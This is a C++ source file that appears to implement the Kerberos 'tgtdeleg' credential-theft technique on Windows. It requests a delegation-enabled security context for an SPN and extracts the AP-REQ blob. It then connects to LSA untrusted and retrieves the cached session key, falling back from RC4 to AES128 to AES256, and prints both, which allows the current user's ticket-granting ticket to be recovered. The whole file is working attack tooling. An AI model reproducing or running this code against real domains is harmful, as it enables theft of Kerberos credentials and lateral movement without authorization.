#include "Header.h"
NTSTATUS statusSuccess = (NTSTATUS)0x00000000;
const NTSTATUS nopackageError = (NTSTATUS)0xC00000FE;
const NTSTATUS namelengthError = (NTSTATUS)0xC0000106;

LPSTR sessionKeyGet;
PBYTE sessKkey;
PBYTE apreqdata;
size_t apreqsize;
void GetSessionKeyType(LONG KeyType) {
	switch (KeyType) {
	case KERB_ETYPE_NULL:
		std::wcout << L"KERB_ETYPE_NULL" << std::endl;
		break;
	case KERB_ETYPE_DES_CBC_CRC:
		std::wcout << L"KERB_ETYPE_DES_CBC_CRC" << std::endl;
		break;
	case KERB_ETYPE_DES_CBC_MD4:
		std::wcout << L"KERB_ETYPE_DES_CBC_MD4" << std::endl;
		break;
	case KERB_ETYPE_RC4_HMAC_NT:
		std::wcout << L"KERB_ETYPE_RC4_HMAC_NT" << std::endl;
		break;
	case KERB_ETYPE_DES_CBC_MD5:
		std::wcout << L"KERB_ETYPE_DES_CBC_MD5" << std::endl;
		break;
	case KERB_ETYPE_RC4_MD4:
		std::wcout << L"KERB_ETYPE_RC4_MD4" << std::endl;
		break;
	case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
		std::wcout << L"KERB_ETYPE_AES256_CTS_HMAC_SHA1_96" << std::endl;
		break;
	case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
		std::wcout << L"KERB_ETYPE_AES128_CTS_HMAC_SHA1_96" << std::endl;
		break;
	case 129:
		std::wcout << L"KERB_ETYPE_RC4_MD5" << std::endl;
		break;
	case 130:
		std::wcout << L"KERB_ETYPE_RC2_MD4" << std::endl;
		break;
	case 131:
		std::wcout << L"KERB_ETYPE_RC2_MD5" << std::endl;
		break;
	default:
		std::wcout << L"Unknown\t(" << KeyType << ")" << std::endl;
		break;
	}
};
NTSTATUS GetSessionKeys(HANDLE lsaHandle, ULONG authpackageId, LONG EncryptionType, LPCWSTR spn, DWORD destSize) {
	PKERB_RETRIEVE_TKT_REQUEST retrieveRequest = NULL;
	PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;
	ULONG bufferLength;
	ULONG returnLength;
	NTSTATUS packageStatus = 0;
	int spnSize = lstrlenW(spn);
	USHORT newSpnSize = ((USHORT)lstrlenW((LPCWSTR)spn) + 1) * sizeof(wchar_t);
	bufferLength = sizeof(KERB_RETRIEVE_TKT_REQUEST) + newSpnSize;
	retrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, bufferLength);
	if (retrieveRequest != NULL) {
		retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
		retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
		retrieveRequest->EncryptionType = EncryptionType;
		retrieveRequest->TargetName.Length = newSpnSize - sizeof(wchar_t);
		retrieveRequest->TargetName.MaximumLength = newSpnSize;
		retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
		RtlMoveMemory(retrieveRequest->TargetName.Buffer, spn, retrieveRequest->TargetName.MaximumLength);
		NTSTATUS callauthPkg = LsaCallAuthenticationPackage(lsaHandle, authpackageId, (PVOID)retrieveRequest, bufferLength, (PVOID*)&retrieveResponse, &returnLength, &packageStatus);
		if (callauthPkg == statusSuccess) {
#ifdef DEBUG
			std::wcout << L"\t[+] Calling AP Kerberos Success" << std::endl;
#endif
			if (packageStatus == statusSuccess) {
				std::wcout << L"\t[+] Successfully getted Kerberos keys with these encryption" << std::endl;
				PVOID sessionkeynob64 = (PVOID)malloc((SIZE_T)retrieveResponse->Ticket.SessionKey.Length);
				if (sessionkeynob64 != NULL) {
					//Copying Session Key
					RtlMoveMemory(sessionkeynob64, retrieveResponse->Ticket.SessionKey.Value, retrieveResponse->Ticket.SessionKey.Length);
					BOOL base641 = CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, (DWORD)retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destSize);
					LPSTR sessionKey = (LPSTR)malloc((SIZE_T)destSize);
					if (sessionKey != NULL) {
						BOOL base641 = CryptBinaryToStringA((CONST BYTE*)sessionkeynob64, (DWORD)retrieveResponse->Ticket.SessionKey.Length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, sessionKey, &destSize);
						if (base641) {
							sessKkey = retrieveResponse->Ticket.SessionKey.Value;
							sessionKeyGet = sessionKey;
							return 0;
						}
						else {
							std::cout << "\t[-] Cant Get string of session key: " << GetLastError() << std::endl;
							return -1;
						}
					}
					else {
						std::cout << "\t[-] Cant LocalAlloc for session key: " << GetLastError() << std::endl;
						return -1;
					}
				}
				else {
					std::cout << "\t[-] Unable to allocate memory for kerberos keys: " << GetLastError << std::endl;
					LocalFree(retrieveRequest);
					LsaFreeReturnBuffer((PVOID)retrieveResponse);
					return -1;
				}
			}
			else {
				return packageStatus;
			}
		}
	}
	else {
		DWORD Gle = GetLastError();
		std::cout << "\t[-] Error LocalAlloc for KERB_RETRIEVE_TKT_REQUEST: " << Gle << std::endl;
		return -1;
	}
}
DWORD TgtDeleg(LPCWSTR spn) {
	CredHandle hCredential;
	TimeStamp tsExpiry;
	SECURITY_STATUS status = AcquireCredentialsHandleW(NULL, (LPWSTR)MICROSOFT_KERBEROS_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredential, &tsExpiry);
	if (status == SEC_E_OK) {
#ifdef DEBUG
		std::wcout << L"[+] AcquireCredentialsHandle Success" << std::endl;
#endif
		CtxtHandle newContext;
		SecBuffer secbufPointer = { 0, SECBUFFER_TOKEN, NULL };
		SecBufferDesc output = { SECBUFFER_VERSION, 1, &secbufPointer };
		ULONG contextAttr;
		TimeStamp expiry;
		SECURITY_STATUS initSecurity = InitializeSecurityContextW(&hCredential, NULL, (SEC_WCHAR*)spn, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &newContext, &output, &contextAttr, NULL);
		if (initSecurity == SEC_E_OK || initSecurity == SEC_I_CONTINUE_NEEDED) {
			std::wcout << L"[+] Initializing GSS-API" << std::endl;
			if (contextAttr & ISC_REQ_DELEGATE) {
#ifdef DEBUG
				std::wcout << L"[+] SPN Supports Unconstrained Deleg" << std::endl;
#endif			
				DWORD destSize;
				//Getting AP-REQ blob
				BOOL base64 = CryptBinaryToStringA((CONST BYTE*)secbufPointer.pvBuffer, (DWORD)secbufPointer.cbBuffer, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &destSize);

				char* apreqbuf = (char*)malloc((SIZE_T)destSize);
				if (apreqbuf == NULL) {
					std::wcout << L"[-] Unable To allocate memory for AS-REQ b64 blob" << std::endl;
					return -1;
				}
				else {
					BOOL base64 = CryptBinaryToStringA((CONST BYTE*)secbufPointer.pvBuffer, (DWORD)secbufPointer.cbBuffer, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, apreqbuf, &destSize);
					if (!base64) {
						std::wcout << L"[-] Unable to Base64 Encode AP-REQ blob" << std::endl;
						return -1;
					}
					else {
						apreqdata = (BYTE*)secbufPointer.pvBuffer;
						apreqsize = secbufPointer.cbBuffer;

						// GETTING Keys For Decrypting BLOB
						HANDLE lsaHandle;
						LSA_STRING kerbPackage;
						kerbPackage.Buffer = (PCHAR)MICROSOFT_KERBEROS_NAME_A;
						kerbPackage.Length = (USHORT)lstrlenA(kerbPackage.Buffer);
						kerbPackage.MaximumLength = kerbPackage.Length + 1;
						ULONG authpackageId;
						NTSTATUS connection = LsaConnectUntrusted(&lsaHandle);
						if (connection == statusSuccess) {
#ifdef DEBUG
							std::wcout << L"[+] Connection to LSA Success" << std::endl;
#endif
							NTSTATUS LookupPckg = LsaLookupAuthenticationPackage(lsaHandle, &kerbPackage, &authpackageId);
							if (LookupPckg == statusSuccess) {
#ifdef DEBUG
								std::wcout << L"[+] Kerberos AP: " << authpackageId << std::endl;
#endif
								std::wcout << L"[+] Trying RC4" << std::endl;
								NTSTATUS sessKey = GetSessionKeys(lsaHandle, authpackageId, 23, spn, destSize);
								if (sessKey == 0xC0000034) {
									std::wcout << L"\t[-] No such keys" << std::endl;
									std::wcout << L"[+] Trying AES128" << std::endl;
									sessKey = GetSessionKeys(lsaHandle, authpackageId, 17, spn, destSize);
									if (sessKey == 0xC0000034) {
										std::wcout << L"\t[-] No such keys" << std::endl;
										std::wcout << L"[+] Trying AES256" << std::endl;
										sessKey = GetSessionKeys(lsaHandle, authpackageId, 18, spn, destSize);
										if (sessKey != 0) {
											std::wcout << L"[-] Error getting AES256 session Keys" << std::endl;
											return -1;
										}
										else {
											std::wcout << "[+] Session Key: " << sessionKeyGet << std::endl;
											std::wcout << "[+] AP-REQ: " << apreqbuf << std::endl;
											return 0;
										}
									}
									else if (sessKey == -1) {
										std::wcout << L"[-] Error getting AES128 session Keys" << std::endl;
										return -1;
									}
									else {
										std::wcout << "[+] Session Key: " << sessionKeyGet << std::endl;
										std::wcout << "[+] AP-REQ: " << apreqbuf << std::endl;
										return 0;
									}
								}
								else if (sessKey == -1) {
									std::wcout << L"[-] Error getting RC4 session Keys" << std::endl;
									return -1;
								}
								else {
									std::wcout << "[+] Session Key: " << sessionKeyGet << std::endl;
									std::wcout << "[+] AP-REQ: " << apreqbuf << std::endl;
									return 0;
								}

							}
							else {
								ULONG Stat = LsaNtStatusToWinError(LookupPckg);
								switch (LookupPckg) {
								case namelengthError:
									std::wcout << L"[-] AP name exceed 127 bytes" << Stat << std::endl;
									free(apreqbuf);
									FreeCredentialHandle(&hCredential);
									break;
								case nopackageError:
									std::wcout << L"[-] Machine doesn't have kerberos AP: " << Stat << std::endl;
									free(apreqbuf);
									FreeCredentialHandle(&hCredential);
									break;
								default:
									std::wcout << L"[-] Unknown Error: " << Stat << std::endl;
									free(apreqbuf);
									FreeCredentialHandle(&hCredential);
									break;
								}
							}
						}
						else {
							ULONG stat = LsaNtStatusToWinError(connection);
							std::cout << "[-] Can't connect to LSA: " << stat << std::endl;
							return -1;
						}
					}
				}
			}
		}
		else {
			switch (initSecurity) {
			case SEC_E_TARGET_UNKNOWN:
				std::wcout << L"[-] SPN wasn't recognized" << std::endl;
				break;
			default:
				std::wcout << L"[-] Unknown Err: 0x" << std::hex << initSecurity << L"L" << std::endl;
				break;
			}
		}
	}
	else {
		switch (status) {
		case SEC_E_INSUFFICIENT_MEMORY:
			std::wcout << L"[-] Not enough memory for current creds" << std::endl;
			break;
		case SEC_E_INTERNAL_ERROR:
			std::wcout << L"[-] SSPI ERROR: 0x" << std::hex << status << L"L" << std::endl;
			break;
		case SEC_E_NO_CREDENTIALS:
			std::wcout << L"[-] No Credentials Available" << std::endl;
			break;
		case SEC_E_NOT_OWNER:
			std::wcout << L"[-] U Dont Have Credentials" << std::endl;
			break;
		case SEC_E_SECPKG_NOT_FOUND:
			std::wcout << L"[-] Kerberos AP is not initialized" << std::endl;
			break;
		case SEC_E_UNKNOWN_CREDENTIALS:
			std::wcout << L"[-] Credentials were not recognized" << std::endl;
			break;
		default:
			std::wcout << L"[-] Unknown Err: 0x" << std::hex << status << L"L" << std::endl;
			break;
		}
	}
	return -1;
}
